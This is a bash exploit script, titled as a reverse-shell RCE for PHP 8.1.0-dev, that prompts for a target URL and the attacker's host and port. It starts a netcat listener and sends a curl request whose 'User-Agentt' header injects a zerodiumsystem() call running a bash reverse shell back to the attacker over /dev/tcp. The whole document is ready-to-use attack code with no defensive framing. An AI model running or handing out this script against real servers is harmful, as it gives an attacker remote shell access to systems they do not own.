#!/bin/bash
RED="\e[31m"
GREEN="\e[32m"
ENDCOLOR="\e[0m"
echo -e "${RED}Enter the full url of target (https://127.0.0.1):${ENDCOLOR}"
read target
echo -e "${RED}Your LHOST for reverse shell:${ENDCOLOR}"
read lhost
echo -e "${RED}Your LPORT for reverse shell:${ENDCOLOR}"
read lport
response=$(curl --write-out '%{http_code}' --silent --output /dev/null $target)
clear
echo "Targets Status code is $response"
echo "--------------------------------------"
echo "Target     : $target"
echo "Local Host : $lhost"
echo "Local Port : $lport"
echo "--------------------------------------"
echo -e "${GREEN}Is this correct? [y/n]:${ENDCOLOR}"
read -n 1 choose
if [[ $choose == "y" ]];then
echo -e "${GREEN}\nOpening new terminal..${ENDCOLOR}"
gnome-terminal -- /bin/bash -c "echo 'Starting in 5 seconds'&&nc -lnvp $lport; exec bash"
sleep 5
curl $target --header "User-Agentt: zerodiumsystem(\"bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'\");"
clear
elif [[ $choose == "n" ]];then
echo -e "\nExiting.."
sleep 1
clear
exit
fi
: '
   Exploit Title: PHP 8.1.0-dev | Reverse shell via rce
   Author: Tabun
  ______      __              
 /_  __/___ _/ /_  __  ______ 
  / / / __ `/ __ \/ / / / __ \
 / / / /_/ / /_/ / /_/ / / / /
/_/  \__,_/_.___/\__,_/_/ /_/      

'
